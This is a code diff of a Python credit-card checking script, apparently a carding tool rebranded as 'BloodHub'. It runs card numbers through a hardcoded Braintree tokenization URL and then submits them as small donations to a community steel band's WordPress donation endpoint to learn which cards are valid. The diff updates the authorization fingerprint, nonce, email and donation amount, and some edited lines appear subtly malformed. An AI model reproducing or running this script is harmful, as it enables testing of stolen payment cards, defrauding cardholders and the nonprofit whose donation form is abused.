@@ -150,10 +150,11 @@ def check_the_creditCard(credit_card, ccCount, proxy="", api='1', proxy_mode=Fal
 
     def braintree_powered():
         ccy = ccYear[2:]
-        braintree_API = f"https://api.braintreegateway.com/merchants/htrc4cypjmp4w2j7/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.30.0&authorizationFingerprint=f3566ef90a5417e14af39fa3f9fb87ba88ae53e05ec273db66c24f8b8b0b083e%7Ccreated_at%3D2019-05-27T13%3A02%3A01.225383348%2B0000%26merchant_id%3Dhtrc4cypjmp4w2j7%26public_key%3Dtjp2xq6vxkc8pvsx&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=08347406-365e-4768-9637-c530090dab5c&share=false&creditCard%5BbillingAddress%5D%5BpostalCode%5D={Postal}&creditCard%5Bnumber%5D={ccNum}&creditCard%5BexpirationMonth%5D={ccMonth}&creditCard%5BexpirationYear%5D={ccy}&creditCard%5Bcvv%5D=458&_method=POST&callback=callback_jsonb70110a1281544e49a156beb0d8b39f8"
+        braintree_API = f"https://api.braintreegateway.com/merchants/htrc4cypjmp4w2j7/client_api/v1/payment_methods?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.30.0&authorizationFingerprint=5db33d819c03fe437dd9b7b60749f1162b369338feaca5d559455a61b5d47859%7Ccreated_at%3D2019-06-19T08%3A09%3A38.750147791%2B0000%26merchant_id%3Dhtrc4cypjmp4w2j7%26public_key%3Dtjp2xq6vxkc8pvsx&_meta%5BsessionId%5D=ff7c27be-d724-4710-ad4a-b400313cf7e7share=false&creditCard%5BbillingAddress%5D%5BpostalCode%5D={Postal}&creditCard%5Bnumber%5D={ccNum}&creditCard%5BexpirationMonth%5D={ccMonth}&creditCard%5BexpirationYear%5D={ccy}&creditCard%5Bcvv%5D=458&_method=POST&callback=callback_json99a70b86cf3947899687c6da134d2202"
+        #braintree_API = f"https://api.braintreegateway.com/merchants/htrc4cypjmp4w2j7/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.30.0&authorizationFingerprint=f3566ef90a5417e14af39fa3f9fb87ba88ae53e05ec273db66c24f8b8b0b083e%7Ccreated_at%3D2019-05-27T13%3A02%3A01.225383348%2B0000%26merchant_id%3Dhtrc4cypjmp4w2j7%26public_key%3Dtjp2xq6vxkc8pvsx&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=08347406-365e-4768-9637-c530090dab5c&share=false&creditCard%5BbillingAddress%5D%5BpostalCode%5D={Postal}&creditCard%5Bnumber%5D={ccNum}&creditCard%5BexpirationMonth%5D={ccMonth}&creditCard%5BexpirationYear%5D={ccy}&creditCard%5Bcvv%5D=458&_method=POST&callback=callback_jsonb70110a1281544e49a156beb0d8b39f8"
         austincommunity_API = "https://austincommunitysteelband.org/wp-admin/admin-ajax.php?action=process_braintree_donation"
         nonce = requests.get(braintree_API).text
-        nonce = nonce.replace('/**/callback_jsonb70110a1281544e49a156beb0d8b39f8(', '')
+        nonce = nonce.replace('/**/callback_json99a70b86cf3947899687c6da134d2202(', '')
         nonce = nonce.replace(')', '')
         nonce = json.loads(nonce)
         nonce_ = ""
@@ -163,8 +164,7 @@ def check_the_creditCard(credit_card, ccCount, proxy="", api='1', proxy_mode=Fal
         first_hash = hashlib.md5(credit_card.encode('utf-8')).hexdigest()
         second_hash = hashlib.md5(first_hash.encode('utf-8'))
 
-        dataContent = f"_wpnonce=657383950d&_wp_http_referer=%2Fdonate-online%2F&billing_first_name=L{firstName}&billing_last_name={lastName}&billing_address_1={Street}&billing_city={City}&billing_state={Region}&billing_postalcode={Postal}&email_address=lancebuan%40gmail.com&donation_message=Just+want+to+help+-DonatePH&donation_amount=1&payment_gateway=bfwc_card_donation_gateway&bfwc_card_donation_nonce={nonce_}&bfwc_device_data=%7B%22device_session_id%22%3A%22{first_hash}%22%2C%22fraud_merchant_id%22%3A%22600000%22%2C%22correlation_id%22%3A%22{second_hash}%22%7D"
-
+        dataContent = f"_wpnonce=49b16f65e7&_wp_http_referer=%2Fdonate-online%2F&billing_first_name={firstName}&billing_last_name={lastName}&billing_address_1={Street}&billing_city={City}&billing_state={Region}&billing_postalcode={Postal}&email_address=bloodhubv1%40gmail.com&donation_message=Donation+Message&donation_amount=10&payment_gateway=bfwc_card_donation_gateway&bfwc_card_donation_nonce={nonce_}&bfwc_device_data=%7B%22device_session_id%22%3A%22{first_hash}%22%2C%22fraud_merchant_id%22%3A%22600000%22%2C%22correlation_id%22%{second_hash}%22%7D"
         req = requests.post(austincommunity_API, data=dataContent, headers={'Content-Type': 'application/x-www-form-urlencoded'})
         results = json.loads(req.text)
         if results['result'] == "failure":
@@ -182,12 +182,7 @@ def check_the_creditCard(credit_card, ccCount, proxy="", api='1', proxy_mode=Fal
 def main():
     global ccCount
     banner = f"""   
-{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|                            {Fore.RED}_|    _|{Fore.GREEN}                      
-{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|_|_|      _|_|      _|_|_|  {Fore.RED}_|  _|  {Fore.GREEN}    _|_|    _|  _|_|  
-{Fore.RED}_|        _|_|    {Fore.YELLOW}_|_|_|_|_|  {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|_|_|_|  _|        {Fore.RED}_|_|    {Fore.GREEN}  _|_|_|_|  _|_|      
-{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|        _|        {Fore.RED}_|  _|  {Fore.GREEN}  _|        _|        
-{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|    _|    _|_|_|    _|_|_|  {Fore.RED}_|    _|{Fore.GREEN}    _|_|_|  _|
-                            {Fore.LIGHTYELLOW_EX}[Created by Codekiller X Saitama]
+                           {Fore.LIGHTYELLOW_EX}[Created by BloodHub]
 """
     print(banner)
     print()
